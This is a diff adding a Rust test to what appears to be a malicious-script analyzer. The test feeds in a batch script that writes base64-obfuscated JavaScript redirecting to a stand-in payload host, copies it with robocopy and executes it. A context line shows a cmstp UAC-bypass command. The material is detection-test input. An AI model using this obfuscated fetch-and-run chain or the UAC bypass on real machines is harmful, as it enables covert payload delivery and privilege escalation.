@@ -14437,6 +14437,23 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn robocopy_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktZGlyLWpzLmV4YW1wbGUvcGF5bG9hZCc=")) > C:\Work\original.js
+robocopy C:\Work C:\Temp original.js
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://robocopy-dir-js.example/payload")
+            }),
+            "robocopy copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmstp_au_direct_command_emits_uac_bypass_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"cmstp.exe /s /au C:\Users\Public\stage.inf"#, &mut env);
